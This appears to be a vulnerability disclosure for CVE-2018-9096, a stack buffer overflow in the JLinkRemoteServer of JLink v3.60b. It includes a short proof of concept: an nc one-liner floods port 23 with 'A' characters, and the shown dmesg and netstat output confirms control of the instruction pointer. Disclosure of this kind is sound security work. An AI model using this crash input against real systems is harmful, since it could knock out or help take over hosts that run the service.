### JLinkRemoteServer Port 23 Buffer Overflow ###

# Product #
JLink v3.60b

# Vulnerability Type #
Buffer Overflow

# CVE Reference #
CVE-2018-9096

# Security Issue #
The JLinkRemoteServer binary contains a stack buffer overflow. This overflow is triggered through input that is received over a Telnet-like service that listens on 0.0.0.0:23. This vulnerability could be exploited to overwrite the functionâ€™s return pointer resulting in remote code execution (RCE) as root.

# Exploit/POC #
The following was performed on 32-bit Debian 9.3

1. In a new terminal on the host server, start the JLinkRemoteServer with sudo privileges:
$ sudo JLinkRemoteServer

2. In a new terminal on the host server, use netstat and observe that a JLInkRemoteServer thread is now listening on 0.0.0.0:23:

$ sudo netstat -tulpn | grep JLinkRemote
tcp        0      0 0.0.0.0:24              0.0.0.0:*               LISTEN      31417/./JLinkRemote 
tcp        0      0 127.0.0.1:19080         0.0.0.0:*               LISTEN      31417/./JLinkRemote 
tcp        0      0 0.0.0.0:19020           0.0.0.0:*               LISTEN      31417/./JLinkRemote 
tcp        0      0 127.0.0.1:19021         0.0.0.0:*               LISTEN      31417/./JLinkRemote 
tcp        0      0 127.0.0.1:19030         0.0.0.0:*               LISTEN      31417/./JLinkRemote 
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      31417/./JLinkRemote

3. On a remote (client) computer, run the following Bash command to send a payload to the server:
$ python -c "print('A'*20000000)" | nc localhost 23 & PID=$!; sleep 5; kill $PID


4. On the host server, observe that JLinkRemoteServer has segfaulted. If it has not, it may take multiple trials. Rerun steps 1-3. 

5. If the process has segfaulted on the first try, use dmesg onx the host server and observe that the process crash at EIP = 0x41414141:

$ sudo dmesg | tail
...
[2786823.881732] JLinkRemoteServ[31402]: segfault at 41414141 ip 41414141 sp b18ff350 error 14

# Network Access #
Local

# Severity #
High

